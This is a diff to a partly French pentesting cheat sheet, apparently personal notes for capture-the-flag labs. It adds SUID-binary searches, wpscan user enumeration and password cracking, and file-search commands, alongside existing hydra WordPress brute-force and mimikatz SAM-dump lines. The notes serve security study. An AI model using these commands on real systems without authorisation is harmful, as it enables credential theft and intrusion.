@@ -78,6 +78,7 @@ find / -perm -u=s -type f 2>/dev/null
 find / -perm -g=s -o -type  f 2>/dev/null
 find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
 find / -user root -perm -4000 -exec ls -ldb {} \;
+find / -perm +6000 2>/dev/null
 
 #chercher les binaire qui peuvent être exécuter avec le groupe <groupe_name>
 find / -group admin -perm /g=x 2>/dev/null
@@ -225,6 +226,10 @@ ssh -L <reverse_port>:127.0.0.1:<port> -i <private_key> <username>@<target_ip_ad
 #TEST VALIDE USER (permet de en fonction de la réponse du serveur si le username est correct)
 hydra -L ./fsocity.dic -p test 10.10.201.188 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
 
+#wpscan enumaration and password crack
+wpscan --url <url_du_site> --enumeration -u
+wpscan --url <url_du_site> -U <list_of_usernames> -P <password_dic> --password-crack wp-scan -t 64
+
 
 ################################# COMMANDES UTILES DE LINUX ##########################
 
@@ -276,3 +281,41 @@ lsadump::sam
 ################################### NMAP CHEATSHEET #######################################
 
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.19.158
+
+
+################################### SEARCH FILE IN LINUX ##################################
+
+#Which of the above files are owned by the best-group
+find / -group best-group 2>/dev/null
+#which has the name <name>
+find / -name "<name>"
+#Which of these files contain an IP address?
+-repertoire courant
+grep -E -l '([0-9]{1,3}\.){3}[0-9]{1,3}' /path/to/directory/*
+
+-avec les sous repertoire
+grep -E -r -l '([0-9]{1,3}\.){3}[0-9]{1,3}' /path/to/directory
+
+-éviter les faut positifs
+grep -E -l '\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b' /path/to/directory/*
+
+#Which file has the SHA1 hash of 9d54da7584015647ba052173b84d45e8007eba94
+find . -type f -exec sha1sum {} + | grep '9d54da7584015647ba052173b84d45e8007eba94'
+
+#Which file contains 230 lines?
+find /path/to/directory -type f -exec wc -l {} + | grep '^ *230 '
+wc -l /path/to/directory/* | awk '$1 == 230 {print $2}'
+
+
+################################# JAVA SERIALISATION EXPLOIT ################################
+
+https://www.baeldung.com/java-serialization
+http://frohoff.github.io/appseccali-marshalling-pickles/
+https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
+https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237
+
+look at script/jboss.zip
+
+
+
+
